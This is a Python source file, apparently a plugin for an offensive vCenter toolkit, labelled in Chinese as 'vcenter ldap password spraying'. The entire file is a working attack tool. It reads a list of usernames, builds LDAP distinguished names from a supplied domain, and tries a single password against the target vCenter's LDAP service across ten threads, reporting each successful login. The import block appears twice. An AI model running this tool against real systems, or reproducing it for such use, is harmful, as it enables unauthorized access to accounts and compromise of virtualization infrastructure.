import argparse
from copy import copy

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes

import argparse
from copy import copy

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes
from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED
from ldap3 import Connection
from threading import Lock

g_lock = Lock()


class PluginVCenterPasswdSpraying(PluginVCenterBase):
    display = "vcenter ldap 密码喷洒"
    alias = "pwd_spray"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", required=True, dest="address")
        parser.add_argument("-f", "--file", help="username file", required=True, dest="user_file")
        parser.add_argument("-p", "--password", help="password", required=True, dest="password")
        parser.add_argument("-d", "--domain", help="domain name(test.lab)", required=True, dest="domain")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        ip = args.address
        user_file = args.user_file
        password = args.password
        domain_name = args.domain

        with open(user_file) as uf:
            with ThreadPoolExecutor(max_workers=10) as pool:
                fs = [pool.submit(ldap_auth, ip, f"cn={u.strip()},cn=Users,dc={domain_name.split('.')[-2]},dc={domain_name.split('.')[-1]}", password) for u
                      in uf]
                wait(fs, return_when=ALL_COMPLETED)

        return result


def ldap_auth(ldap_ip, user_dn, password):
    try:
        Connection(ldap_ip, user_dn, password, auto_bind=True)
        output.success(f'[+] success password:{user_dn} -> {password}')
    except Exception as e:
        g_lock.acquire()
        output.info(f'[-] {password} - {e}')
        g_lock.release()
